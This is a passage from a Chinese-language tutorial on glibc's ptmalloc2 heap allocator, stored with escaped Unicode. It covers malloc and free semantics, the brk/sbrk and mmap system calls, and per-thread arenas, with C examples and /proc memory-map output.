\u5b9e\u73b0\uff0c\u4f46\u5b83\u5728\u5e76\u884c\u5904\u7406\u591a\u4e2a\u7ebf\u7a0b\u65f6\uff0c\u4f1a\u5171\u4eab\u8fdb\u7a0b\u7684\u5806\u5185\u5b58\u7a7a\u95f4\u3002\u56e0\u6b64\uff0c\u4e3a\u4e86\u5b89\u5168\u6027\uff0c\u4e00\u4e2a\u7ebf\u7a0b\u4f7f\u7528\u5806\u65f6\uff0c\u4f1a\u8fdb\u884c\u52a0\u9501\u3002\u7136\u800c\uff0c\u4e0e\u6b64\u540c\u65f6\uff0c\u52a0\u9501\u4f1a\u5bfc\u81f4\u5176\u5b83\u7ebf\u7a0b\u65e0\u6cd5\u4f7f\u7528\u5806\uff0c\u964d\u4f4e\u4e86\u5185\u5b58\u5206\u914d\u548c\u56de\u6536\u7684\u9ad8\u6548\u6027\u3002\u540c\u65f6\uff0c\u5982\u679c\u5728\u591a\u7ebf\u7a0b\u4f7f\u7528\u65f6\uff0c\u6ca1\u80fd\u6b63\u786e\u63a7\u5236\uff0c\u4e5f\u53ef\u80fd\u5f71\u54cd\u5185\u5b58\u5206\u914d\u548c\u56de\u6536\u7684\u6b63\u786e\u6027\u3002Wolfram Gloger \u5728 Doug Lea \u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u6539\u8fdb\u4f7f\u5176\u53ef\u4ee5\u652f\u6301\u591a\u7ebf\u7a0b\uff0c\u8fd9\u4e2a\u5806\u5206\u914d\u5668\u5c31\u662f ptmalloc \u3002\u5728 glibc-2.3.x. \u4e4b\u540e\uff0cglibc \u4e2d\u96c6\u6210\u4e86 ptmalloc2\u3002 \u76ee\u524d Linux \u6807\u51c6\u53d1\u884c\u7248\u4e2d\u4f7f\u7528\u7684\u5806\u5206\u914d\u5668\u662f glibc \u4e2d\u7684\u5806\u5206\u914d\u5668\uff1aptmalloc2\u3002ptmalloc2 \u4e3b\u8981\u662f\u901a\u8fc7 malloc/free \u51fd\u6570\u6765\u5206\u914d\u548c\u91ca\u653e\u5185\u5b58\u5757\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u5185\u5b58\u5206\u914d\u4e0e\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0cLinux \u6709\u8fd9\u6837\u7684\u4e00\u4e2a\u57fa\u672c\u5185\u5b58\u7ba1\u7406\u601d\u60f3\uff0c \u53ea\u6709\u5f53\u771f\u6b63\u8bbf\u95ee\u4e00\u4e2a\u5730\u5740\u7684\u65f6\u5019\uff0c\u7cfb\u7edf\u624d\u4f1a\u5efa\u7acb\u865a\u62df\u9875\u9762\u4e0e\u7269\u7406\u9875\u9762\u7684\u6620\u5c04\u5173\u7cfb \u3002 \u6240\u4ee5\u867d\u7136\u64cd\u4f5c\u7cfb\u7edf\u5df2\u7ecf\u7ed9\u7a0b\u5e8f\u5206\u914d\u4e86\u5f88\u5927\u7684\u4e00\u5757\u5185\u5b58\uff0c\u4f46\u662f\u8fd9\u5757\u5185\u5b58\u5176\u5b9e\u53ea\u662f\u865a\u62df\u5185\u5b58\u3002\u53ea\u6709\u5f53\u7528\u6237\u4f7f\u7528\u5230\u76f8\u5e94\u7684\u5185\u5b58\u65f6\uff0c\u7cfb\u7edf\u624d\u4f1a\u771f\u6b63\u5206\u914d\u7269\u7406\u9875\u9762\u7ed9\u7528\u6237\u4f7f\u7528\u3002 \u5806\u7684\u57fa\u672c\u64cd\u4f5c \u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd \u57fa\u672c\u7684\u5806\u64cd\u4f5c\uff0c\u5305\u62ec\u5806\u7684\u5206\u914d\uff0c\u56de\u6536\uff0c\u5806\u5206\u914d\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528 \u4ecb\u7ecd\u5806\u76ee\u524d\u7684\u591a\u7ebf\u7a0b\u652f\u6301\u3002 malloc \u5728 glibc \u7684 malloc.c \u4e2d\uff0cmalloc \u7684\u8bf4\u660e\u5982\u4e0b /* malloc(size_t n) Returns a pointer to a newly allocated chunk of at least n bytes, or null if no space is available. Additionally, on failure, errno is set to ENOMEM on ANSI C systems. If n is zero, malloc returns a minumum-sized chunk. (The minimum size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit systems.) On most systems, size_t is an unsigned type, so calls with negative arguments are interpreted as requests for huge amounts of space, which will often fail. The maximum supported value of n differs across systems, but is in all cases less than the maximum representable value of a size_t. */ \u53ef\u4ee5\u770b\u51fa\uff0cmalloc \u51fd\u6570\u8fd4\u56de\u5bf9\u5e94\u5927\u5c0f\u5b57\u8282\u7684\u5185\u5b58\u5757\u7684 \u6307\u9488 ^2 \u3002\u6b64\u5916\uff0c\u8be5\u51fd\u6570\u8fd8\u5bf9\u4e00\u4e9b\u5f02\u5e38\u60c5\u51b5\u8fdb\u884c\u4e86\u5904\u7406 \u5f53 n=0 \u65f6\uff0c\u8fd4\u56de\u5f53\u524d\u7cfb\u7edf\u5141\u8bb8\u7684\u5806\u7684\u6700\u5c0f\u5185\u5b58\u5757\u3002 \u5f53 n \u4e3a\u8d1f\u6570\u65f6\uff0c\u7531\u4e8e\u5728\u5927\u591a\u6570\u7cfb\u7edf\u4e0a\uff0c size_t \u662f \u65e0\u7b26\u53f7\u6570 \uff08\u8fd9\u4e00\u70b9\u975e\u5e38\u91cd\u8981\uff09 \uff0c\u6240\u4ee5\u7a0b\u5e8f\u5c31\u4f1a\u7533\u8bf7\u5f88\u5927\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u4f46\u901a\u5e38\u6765\u8bf4\u90fd\u4f1a\u5931\u8d25\uff0c\u56e0\u4e3a\u7cfb\u7edf\u6ca1\u6709\u90a3\u4e48\u591a\u7684\u5185\u5b58\u53ef\u4ee5\u5206\u914d\u3002 free \u5728 glibc \u7684 malloc.c \u4e2d\uff0cfree \u7684\u8bf4\u660e\u5982\u4e0b /* free(void* p) Releases the chunk of memory pointed to by p, that had been previously allocated using malloc or a related routine such as realloc. It has no effect if p is null. It can have arbitrary (i.e., bad!) effects if p has already been freed. Unless disabled (using mallopt), freeing very large spaces will when possible, automatically trigger operations that give back unused memory to the system, thus reducing program footprint. */ \u53ef\u4ee5\u770b\u51fa\uff0cfree \u51fd\u6570\u4f1a\u91ca\u653e\u7531 p \u6240\u6307\u5411\u7684\u5185\u5b58\u5757\u3002\u8fd9\u4e2a\u5185\u5b58\u5757\u6709\u53ef\u80fd\u662f\u901a\u8fc7 malloc \u51fd\u6570\u5f97\u5230\u7684\uff0c\u4e5f\u6709\u53ef\u80fd\u662f\u901a\u8fc7\u76f8\u5173\u7684\u51fd\u6570 realloc \u5f97\u5230\u7684\u3002 \u6b64\u5916\uff0c\u8be5\u51fd\u6570\u4e5f\u540c\u6837\u5bf9\u5f02\u5e38\u60c5\u51b5\u8fdb\u884c\u4e86\u5904\u7406 \u5f53 p \u4e3a\u7a7a\u6307\u9488\u65f6\uff0c\u51fd\u6570\u4e0d\u6267\u884c\u4efb\u4f55\u64cd\u4f5c\u3002 \u5f53 p \u5df2\u7ecf\u88ab\u91ca\u653e\u4e4b\u540e\uff0c\u518d\u6b21\u91ca\u653e\u4f1a\u51fa\u73b0\u4e71\u4e03\u516b\u7cdf\u7684\u6548\u679c\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f double free \u3002 \u9664\u4e86\u88ab\u7981\u7528 (mallopt) \u7684\u60c5\u51b5\u4e0b\uff0c\u5f53\u91ca\u653e\u5f88\u5927\u7684\u5185\u5b58\u7a7a\u95f4\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u5c06\u8fd9\u4e9b\u5185\u5b58\u7a7a\u95f4\u8fd8\u7ed9\u7cfb\u7edf\uff0c\u4ee5\u4fbf\u4e8e\u51cf\u5c0f\u7a0b\u5e8f\u6240\u4f7f\u7528\u7684\u5185\u5b58\u7a7a\u95f4\u3002 ^3 \u5185\u5b58\u5206\u914d\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528 \u5728\u524d\u9762\u63d0\u5230\u7684\u51fd\u6570\u4e2d\uff0c\u65e0\u8bba\u662f malloc \u51fd\u6570\u8fd8\u662f free \u51fd\u6570\uff0c\u6211\u4eec\u52a8\u6001\u7533\u8bf7\u548c\u91ca\u653e\u5185\u5b58\u65f6\uff0c\u90fd\u7ecf\u5e38\u4f1a\u4f7f\u7528\uff0c\u4f46\u662f\u5b83\u4eec\u5e76\u4e0d\u662f\u771f\u6b63\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u7684\u51fd\u6570\u3002\u8fd9\u4e9b\u51fd\u6570\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528\u4e3b\u8981\u662f (s)brk \u51fd\u6570\u4ee5\u53ca mmap, munmap \u51fd\u6570\u3002[^4] [^4]:\u4e5f\u5c31\u662f\u76f8\u5f53\u4e8e malloc \u662f\u4e00\u4e2a\u6574\u5408\u5305\uff0c\u6253\u5305\u597d\u5b9e\u73b0\u7533\u8bf7\u5806\u5757\u9700\u8981\u7528\u5230\u7684\u6240\u6709\u51fd\u6570\u3002\u7c7b\u4f3c\u7684\u51fd\u6570\u8fd8\u6709 system \u7b49 \u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6211\u4eec\u4e3b\u8981\u8003\u8651\u5bf9\u5806\u8fdb\u884c\u7533\u8bf7\u5185\u5b58\u5757\u7684\u64cd\u4f5c\u3002 (s)brk \u5bf9\u4e8e\u5806\u7684\u64cd\u4f5c\uff0c\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u4e86 brk \u51fd\u6570\uff0cglibc \u5e93\u63d0\u4f9b\u4e86 sbrk \u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u589e\u52a0 brk \u7684\u5927\u5c0f\u6765\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58\u3002 \u521d\u59cb\u65f6\uff0c\u5806\u7684\u8d77\u59cb\u5730\u5740 start_brk \u4ee5\u53ca\u5806\u7684\u5f53\u524d\u672b\u5c3e brk \u6307\u5411\u540c\u4e00\u5730\u5740\u3002\u6839\u636e\u662f\u5426\u5f00\u542f ASLR\uff0c\u4e24\u8005\u7684\u5177\u4f53\u4f4d\u7f6e\u4f1a\u6709\u6240\u4e0d\u540c \u4e0d\u5f00\u542f ASLR \u4fdd\u62a4\u65f6\uff0cstart_brk \u4ee5\u53ca brk \u4f1a\u6307\u5411 data/bss \u6bb5\u7684\u7ed3\u5c3e\u3002 \u5f00\u542f ASLR \u4fdd\u62a4\u65f6\uff0cstart_brk \u4ee5\u53ca brk \u4e5f\u4f1a\u6307\u5411\u540c\u4e00\u4f4d\u7f6e\uff0c\u53ea\u662f\u8fd9\u4e2a\u4f4d\u7f6e\u662f\u5728 data/bss \u6bb5\u7ed3\u5c3e\u540e\u7684\u968f\u673a\u504f\u79fb\u5904\u3002 \u5177\u4f53\u6548\u679c\u5982\u4e0b\u56fe\uff08\u8fd9\u4e2a\u56fe\u7247\u4e0e\u7f51\u4e0a\u6d41\u4f20\u7684\u57fa\u672c\u4e00\u81f4\uff0c\u8fd9\u91cc\u662f\u56e0\u4e3a\u8981\u753b\u4e00\u5f20\u5927\u56fe\uff0c\u6240\u4ee5\u81ea\u5df1\u5355\u72ec\u753b\u4e86\u4e0b\uff09\u6240\u793a \u4f8b\u5b50 /* sbrk and brk example */ #include <stdio.h> #include <unistd.h> #include <sys/types.h> int main() { void *curr_brk, *tmp_brk = NULL; printf(\"Welcome to sbrk example:%d\\n\", getpid()); /* sbrk(0) gives current program break location */ tmp_brk = curr_brk = sbrk(0); printf(\"Program Break Location1:%p\\n\", curr_brk); getchar(); /* brk(addr) increments/decrements program break location */ brk(curr_brk+4096); curr_brk = sbrk(0); printf(\"Program break Location2:%p\\n\", curr_brk); getchar(); brk(tmp_brk); curr_brk = sbrk(0); printf(\"Program Break Location3:%p\\n\", curr_brk); getchar(); return 0; } //gcc sbrk_brk_example.c -m32 -o ./sbrk_brk_example \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u6bcf\u4e00\u6b21\u6267\u884c\u5b8c\u64cd\u4f5c\u540e\uff0c\u90fd\u6267\u884c\u4e86 getchar() \u51fd\u6570\uff0c\u8fd9\u662f\u4e3a\u4e86\u6211\u4eec\u65b9\u4fbf\u6211\u4eec\u67e5\u770b\u7a0b\u5e8f\u771f\u6b63\u7684\u6620\u5c04\u3002 \u5728\u7b2c\u4e00\u6b21\u8c03\u7528 brk \u4e4b\u524d \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5e76\u6ca1\u6709\u51fa\u73b0\u5806\u3002\u56e0\u6b64 start_brk = brk = end_data = 0x806c000 \u7b2c\u4e00\u6b21\u589e\u52a0 brk \u540e \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5df2\u7ecf\u51fa\u73b0\u4e86\u5806\u6bb5 start_brk = end_data = 0x806c000 brk = 0x806d000 \u5176\u4e2d\uff0c\u5173\u4e8e\u5806\u7684\u90a3\u4e00\u884c 0x806c000\u662f\u76f8\u5e94\u5806\u7684\u8d77\u59cb\u5730\u5740 rw-p \u8868\u660e\u5806\u5177\u6709\u53ef\u8bfb\u53ef\u5199\u6743\u9650\uff0c\u5e76\u4e14\u5c5e\u4e8e\u9690\u79c1\u6570\u636e\u3002 00000000 \u8868\u660e\u6587\u4ef6\u504f\u79fb\uff0c\u7531\u4e8e\u8fd9\u90e8\u5206\u5185\u5bb9\u5e76\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e3a 0\u3002 00:00 \u662f\u4e3b\u4ece (Major/mirror) \u7684\u8bbe\u5907\u53f7\uff0c\u8fd9\u90e8\u5206\u5185\u5bb9\u4e5f\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e5f\u90fd\u4e3a 0\u3002 0 \u8868\u793a\u7740 Inode \u53f7\u3002\u7531\u4e8e\u8fd9\u90e8\u5206\u5185\u5bb9\u5e76\u4e0d\u662f\u4ece\u6587\u4ef6\u4e2d\u6620\u5c04\u5f97\u5230\u7684\uff0c\u6240\u4ee5\u4e3a 0\u3002 \u7136\u540e\u901a\u8fc7 brk(tmp_brk); \u5c06\u6307\u9488\u5f52\u4f4d\u56de\u5230 0x806c000 \uff0c\u65b0\u51fa\u73b0\u7684 heap \u6d88\u5931\u3002\u5177\u4f53\u548c\u7b2c\u4e00\u6b65\u56fe\u4e00\u6837\uff0c\u4e0d\u8d34\u56fe\u4e86\u3002 mmap malloc \u4f1a\u4f7f\u7528 mmap \u6765\u521b\u5efa\u72ec\u7acb\u7684\u533f\u540d\u6620\u5c04\u6bb5\u3002\u533f\u540d\u6620\u5c04\u7684\u76ee\u7684\u4e3b\u8981\u662f\u53ef\u4ee5\u7533\u8bf7\u4ee5 0 \u586b\u5145\u7684\u5185\u5b58\uff0c\u5e76\u4e14\u8fd9\u5757\u5185\u5b58\u4ec5\u88ab\u8c03\u7528\u8fdb\u7a0b\u6240\u4f7f\u7528\u3002 \u4f8b\u5b50 /* Private anonymous mapping example using mmap syscall */ #include <stdio.h> #include <sys/mman.h> #include <sys/types.h> #include <sys/stat.h> #include <fcntl.h> #include <unistd.h> #include <stdlib.h> void static inline errExit(const char* msg) { printf(\"%s failed. Exiting the process\\n\", msg); exit(-1); } int main() { int ret = -1; printf(\"Welcome to private anonymous mapping example::PID:%d\\n\", getpid()); printf(\"Before mmap\\n\"); getchar(); char* addr = NULL; addr = mmap(NULL, (size_t)132*1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); if (addr == MAP_FAILED) errExit(\"mmap\"); printf(\"After mmap\\n\"); getchar(); /* Unmap mapped region. */ ret = munmap(addr, (size_t)132*1024); if(ret == -1) errExit(\"munmap\"); printf(\"After munmap\\n\"); getchar(); return 0; } \u5728\u6267\u884c mmap \u4e4b\u524d \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u770b\u5230\uff0c\u76ee\u524d\u53ea\u6709. so \u6587\u4ef6\u7684 mmap \u6bb5\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000-08049000 r-xp 00000000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000-0804a000 r--p 00000000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 0804a000-0804b000 rw-p 00001000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap b7e21000-b7e22000 rw-p 00000000 00:00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ mmap \u540e \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u7533\u8bf7\u7684\u5185\u5b58\u4e0e\u5df2\u7ecf\u5b58\u5728\u7684\u5185\u5b58\u6bb5\u7ed3\u5408\u5728\u4e86\u4e00\u8d77\u6784\u6210\u4e86 b7e00000 \u5230 b7e21000 \u7684 mmap \u6bb5\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000-08049000 r-xp 00000000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000-0804a000 r--p 00000000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 0804a000-0804b000 rw-p 00001000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap b7e00000-b7e22000 rw-p 00000000 00:00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ munmap \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u539f\u6765\u7533\u8bf7\u7684\u5185\u5b58\u6bb5\u5df2\u7ecf\u6ca1\u6709\u4e86\uff0c\u5185\u5b58\u6bb5\u53c8\u6062\u590d\u4e86\u539f\u6765\u7684\u6837\u5b50\u4e86\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000-08049000 r-xp 00000000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000-0804a000 r--p 00000000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 0804a000-0804b000 rw-p 00001000 08:01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap b7e21000-b7e22000 rw-p 00000000 00:00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ \u591a\u7ebf\u7a0b\u652f\u6301 \u5728\u539f\u6765\u7684 dlmalloc \u5b9e\u73b0\u4e2d\uff0c\u5f53\u4e24\u4e2a\u7ebf\u7a0b\u540c\u65f6\u8981\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\u53ef\u4ee5\u8fdb\u5165\u4e34\u754c\u533a\u7533\u8bf7\u5185\u5b58\uff0c\u800c\u53e6\u5916\u4e00\u4e2a\u7ebf\u7a0b\u5219\u5fc5\u987b\u7b49\u5f85\u76f4\u5230\u4e34\u754c\u533a\u4e2d\u4e0d\u518d\u6709\u7ebf\u7a0b\u3002\u8fd9\u662f\u56e0\u4e3a\u6240\u6709\u7684\u7ebf\u7a0b\u5171\u4eab\u4e00\u4e2a\u5806\u3002\u5728 glibc \u7684 ptmalloc \u5b9e\u73b0\u4e2d\uff0c\u6bd4\u8f83\u597d\u7684\u4e00\u70b9\u5c31\u662f\u652f\u6301\u4e86\u591a\u7ebf\u7a0b\u7684\u5feb\u901f\u8bbf\u95ee\u3002\u5728\u65b0\u7684\u5b9e\u73b0\u4e2d\uff0c\u6240\u6709\u7684\u7ebf\u7a0b\u5171\u4eab\u591a\u4e2a\u5806\u3002 \u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\u3002 /* Per thread arena example. */ #include <stdio.h> #include <stdlib.h> #include <pthread.h> #include <unistd.h> #include <sys/types.h> void* threadFunc(void* arg) { printf(\"Before malloc in thread 1\\n\"); getchar(); char* addr = (char*) malloc(1000); printf(\"After malloc and before free in thread 1\\n\"); getchar(); free(addr); printf(\"After free in thread 1\\n\"); getchar(); } int main() { pthread_t t1; void* s; int ret; char* addr; printf(\"Welcome to per thread arena example::%d\\n\",getpid()); printf(\"Before malloc in main thread\\n\"); getchar(); addr = (char*) malloc(1000); printf(\"After malloc and before free in main thread\\n\"); getchar(); free(addr); printf(\"After free in main thread\\n\"); getchar(); ret = pthread_create(&t1, NULL, threadFunc, NULL); if(ret) { printf(\"Thread creation error\\n\"); return -1; } ret = pthread_join(t1, &s); if(ret) { printf(\"Thread join error\\n\"); return -1; } return 0; } \u7b2c\u4e00\u6b21\u7533\u8bf7\u4e4b\u524d \uff0c \u6ca1\u6709\u4efb\u4f55\u4efb\u4f55\u5806\u6bb5\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread b7e05000-b7e07000 rw-p 00000000 00:00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u7b2c\u4e00\u6b21\u7533\u8bf7\u540e \uff0c \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5806\u6bb5\u88ab\u5efa\u7acb\u4e86\uff0c\u5e76\u4e14\u5b83\u5c31\u7d27\u90bb\u7740\u6570\u636e\u6bb5\uff0c\u8fd9\u8bf4\u660e malloc \u7684\u80cc\u540e\u662f\u7528 brk \u51fd\u6570\u6765\u5b9e\u73b0\u7684\u3002\u540c\u65f6\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u867d\u7136\u53ea\u662f\u7533\u8bf7\u4e86 1000 \u4e2a\u5b57\u8282\uff0c\u4f46\u662f\u6211\u4eec\u5374\u5f97\u5230\u4e86 0x0806c000-0x0804b000=0x21000 \u4e2a\u5b57\u8282\u7684\u5806\u3002 \u8fd9\u8bf4\u660e\u867d\u7136\u7a0b\u5e8f\u53ef\u80fd\u53ea\u662f\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5f88\u5c0f\u7684\u5185\u5b58\uff0c\u4f46\u662f\u4e3a\u4e86\u65b9\u4fbf\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u628a\u5f88\u5927\u7684\u5185\u5b58\u5206\u914d\u7ed9\u7a0b\u5e8f\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u5c31\u907f\u514d\u4e86\u591a\u6b21\u5185\u6838\u6001\u4e0e\u7528\u6237\u6001\u7684\u5207\u6362\uff0c\u63d0\u9ad8\u4e86\u7a0b\u5e8f\u7684\u6548\u7387\u3002 \u6211\u4eec\u79f0\u8fd9\u4e00\u5757\u8fde\u7eed\u7684\u5185\u5b58\u533a\u57df\u4e3a arena\u3002\u6b64\u5916\uff0c\u6211\u4eec\u79f0\u7531\u4e3b\u7ebf\u7a0b\u7533\u8bf7\u7684\u5185\u5b58\u4e3a main_arena\u3002\u540e\u7eed\u7684\u7533\u8bf7\u7684\u5185\u5b58\u4f1a\u4e00\u76f4\u4ece\u8fd9\u4e2a arena \u4e2d\u83b7\u53d6\uff0c\u76f4\u5230\u7a7a\u95f4\u4e0d\u8db3\u3002\u5f53 arena \u7a7a\u95f4\u4e0d\u8db3\u65f6\uff0c\u5b83\u53ef\u4ee5\u901a\u8fc7\u589e\u52a0 brk \u7684\u65b9\u5f0f\u6765\u589e\u52a0\u5806\u7684\u7a7a\u95f4\u3002\u7c7b\u4f3c\u5730\uff0carena \u4e5f\u53ef\u4ee5\u901a\u8fc7\u51cf\u5c0f brk \u6765\u7f29\u5c0f\u81ea\u5df1\u7684\u7a7a\u95f4\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread ... sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00:00 0 [heap] b7e05000-b7e07000 rw-p 00000000 00:00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u5728\u4e3b\u7ebf\u7a0b\u91ca\u653e\u5185\u5b58\u540e \uff0c\u6211\u4eec\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5176\u5bf9\u5e94\u7684 arena \u5e76\u6ca1\u6709\u8fdb\u884c\u56de\u6536\uff0c\u800c\u662f\u4ea4\u7531 glibc \u6765\u8fdb\u884c\u7ba1\u7406\u3002\u5f53\u540e\u9762\u7a0b\u5e8f\u518d\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u5728 glibc \u4e2d\u7ba1\u7406\u7684\u5185\u5b58\u5145\u8db3\u7684\u60c5\u51b5\u4e0b\uff0cglibc \u5c31\u4f1a\u6839\u636e\u5806\u5206\u914d\u7684\u7b97\u6cd5\u6765\u7ed9\u7a0b\u5e8f\u5206\u914d\u76f8\u5e94\u7684\u5185\u5b58\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread ... sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00:00 0 [heap] b7e05000-b7e07000 rw-p 00000000 00:00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u5728\u7b2c\u4e00\u4e2a\u7ebf\u7a0b malloc \u4e4b\u524d \uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5e76\u6ca1\u6709\u51fa\u73b0\u4e0e\u7ebf\u7a0b 1 \u76f8\u5173\u7684\u5806\uff0c\u4f46\u662f\u51fa\u73b0\u4e86\u4e0e\u7ebf\u7a0b 1 \u76f8\u5173\u7684\u6808\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread Before malloc in thread 1 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000-08049000 r-xp 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000-0804a000 r--p 00000000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08:01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00:00 0 [heap] b7604000-b7605000 ---p 00000000 00:00 0 b7605000-b7e07000 rw-p 00000000 00:00 0 [stack:6594] ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u7b2c\u4e00\u4e2a\u7ebf\u7a0b malloc \u540e \uff0c \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u8f93\u51fa\u770b\u51fa\u7ebf\u7a0b 1 \u7684\u5806\u6bb5\u88ab\u5efa\u7acb\u4e86\u3002\u800c\u4e14\u5b83\u6240\u5728\u7684\u4f4d\u7f6e\u4e3a\u5185\u5b58\u6620\u5c04\u6bb5\u533a\u57df\uff0c\u540c\u6837\u5927\u5c0f\u4e5f\u662f 132KB(b7500000-b7521000)\u3002\u56e0\u6b64\u8fd9\u8868\u660e\u8be5\u7ebf\u7a0b\u7533\u8bf7\u7684\u5806\u65f6\uff0c\u80cc\u540e\u5bf9\u5e94\u7684\u51fd\u6570\u4e3a mmap \u51fd\u6570\u3002\u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u5b9e\u9645\u771f\u7684\u5206\u914d\u7ed9\u7a0b\u5e8f\u7684\u5185\u5b58\u4e3a 1M(b7500000-b7600000)\u3002\u800c\u4e14\uff0c\u53ea\u6709 132KB \u7684\u90e8\u5206\u5177\u6709\u53ef\u8bfb\u53ef\u5199\u6743\u9650\uff0c\u8fd9\u4e00\u5757\u8fde\u7eed\u7684\u533a\u57df\u6210\u4e3a thread arena\u3002 \u6ce8\u610f\uff1a 